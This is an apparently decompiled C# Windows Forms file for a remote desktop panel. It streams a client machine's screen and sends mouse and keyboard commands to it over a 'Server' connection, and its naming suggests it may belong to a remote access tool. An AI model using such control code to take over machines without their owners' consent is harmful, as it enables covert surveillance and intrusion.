using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormDesktop : FormMaterial
{
	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	private List<Keys> _keysPressed = new List<Keys>();

	public Size screen;

	public Clients client;

	public Clients parrent;

	private Point point2 = new Point(0, 0);

	private const int threshold = 15;

	private IContainer components;

	public NumericUpDown numericUpDown2;

	public MaterialSwitch materialSwitch1;

	public MaterialSwitch materialSwitch2;

	public MaterialSwitch materialSwitch3;

	public MaterialSwitch materialSwitch4;

	public PictureBox pictureBox1;

	private Panel panel1;

	public Timer timer1;

	public FormDesktop()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormDesktop_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		pictureBox1.MouseMove += pictureBox1_MouseMove;
		pictureBox1.MouseDown += pictureBox1_MouseDown;
		pictureBox1.MouseUp += pictureBox1_MouseUp;
		pictureBox1.MouseWheel += PictureBox_MouseWheel;
		base.KeyPreview = true;
		pictureBox1.Focus();
		base.KeyDown += FormRemoteDesktop_KeyDown;
		base.KeyUp += FormRemoteDesktop_KeyUp;
	}

	private void ChangeScheme(object sender)
	{
		numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[4]
			{
				"Capture",
				true,
				(byte)numericUpDown2.Value,
				materialSwitch4.Checked
			});
		}
		else
		{
			client.Send(new object[2] { "Capture", false });
		}
	}

	private void numericUpDown2_ValueChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[2]
			{
				"Quality",
				(byte)numericUpDown2.Value
			});
		}
	}

	private void materialSwitch4_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[2] { "Sharpdx", materialSwitch4.Checked });
		}
	}

	private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 2;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 8;
				}
				client.Send(new object[2] { "MouseClick", b });
			}
		}
		catch
		{
		}
	}

	private void PictureBox_MouseWheel(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				int delta = e.Delta;
				client.Send(new object[2] { "MouseScroll", delta });
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 4;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 16;
				}
				client.Send(new object[2] { "MouseClick", b });
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				if (Math.Abs(point.X - point2.X) >= 15 || Math.Abs(point.Y - point2.Y) >= 15)
				{
					point2 = point;
					client.Send(new object[3] { "MouseMove", point.X, point.Y });
				}
			}
		}
		catch
		{
		}
	}

	private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
	{
		if (materialSwitch1.Checked && materialSwitch3.Checked)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (!_keysPressed.Contains(e.KeyCode))
			{
				_keysPressed.Add(e.KeyCode);
				client.Send(new object[3]
				{
					"KeyboardClick",
					true,
					(int)e.KeyCode
				});
			}
		}
	}

	private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
	{
		if (materialSwitch1.Checked && materialSwitch3.Checked)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			_keysPressed.Remove(e.KeyCode);
			client.Send(new object[3]
			{
				"KeyboardClick",
				false,
				(int)e.KeyCode
			});
		}
	}

	private bool IsLockKey(Keys key)
	{
		if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
		{
			return (key & Keys.Scroll) == Keys.Scroll;
		}
		return true;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch3 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch4 = new MaterialSkin.Controls.MaterialSwitch();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
		this.panel1 = new System.Windows.Forms.Panel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
		base.SuspendLayout();
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(3, 64);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 0;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Enabled = false;
		this.materialSwitch2.Location = new System.Drawing.Point(234, 64);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(106, 37);
		this.materialSwitch2.TabIndex = 1;
		this.materialSwitch2.Text = "Mouse";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch3.AutoSize = true;
		this.materialSwitch3.Depth = 0;
		this.materialSwitch3.Enabled = false;
		this.materialSwitch3.Location = new System.Drawing.Point(352, 64);
		this.materialSwitch3.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch3.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch3.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch3.Name = "materialSwitch3";
		this.materialSwitch3.Ripple = true;
		this.materialSwitch3.Size = new System.Drawing.Size(125, 37);
		this.materialSwitch3.TabIndex = 2;
		this.materialSwitch3.Text = "Keyboard";
		this.materialSwitch3.UseVisualStyleBackColor = true;
		this.materialSwitch4.AutoSize = true;
		this.materialSwitch4.Depth = 0;
		this.materialSwitch4.Enabled = false;
		this.materialSwitch4.Location = new System.Drawing.Point(491, 64);
		this.materialSwitch4.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch4.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch4.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch4.Name = "materialSwitch4";
		this.materialSwitch4.Ripple = true;
		this.materialSwitch4.Size = new System.Drawing.Size(109, 37);
		this.materialSwitch4.TabIndex = 3;
		this.materialSwitch4.Text = "DirectX";
		this.materialSwitch4.UseVisualStyleBackColor = true;
		this.materialSwitch4.CheckedChanged += new System.EventHandler(materialSwitch4_CheckedChanged);
		this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pictureBox1.Location = new System.Drawing.Point(6, 104);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(813, 427);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 4;
		this.pictureBox1.TabStop = false;
		this.numericUpDown2.BackColor = System.Drawing.Color.White;
		this.numericUpDown2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown2.Enabled = false;
		this.numericUpDown2.ForeColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.numericUpDown2.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numericUpDown2.Location = new System.Drawing.Point(112, 73);
		this.numericUpDown2.Margin = new System.Windows.Forms.Padding(2);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Size = new System.Drawing.Size(42, 20);
		this.numericUpDown2.TabIndex = 19;
		this.numericUpDown2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown2.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown2.Value = new decimal(new int[4] { 80, 0, 0, 0 });
		this.numericUpDown2.ValueChanged += new System.EventHandler(numericUpDown2_ValueChanged);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(819, 470);
		this.panel1.TabIndex = 20;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(825, 537);
		base.Controls.Add(this.numericUpDown2);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.materialSwitch4);
		base.Controls.Add(this.materialSwitch3);
		base.Controls.Add(this.materialSwitch2);
		base.Controls.Add(this.materialSwitch1);
		base.Controls.Add(this.panel1);
		base.DrawerUseColors = true;
		base.Name = "FormDesktop";
		this.Text = "Desktop";
		base.Load += new System.EventHandler(FormDesktop_Load);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
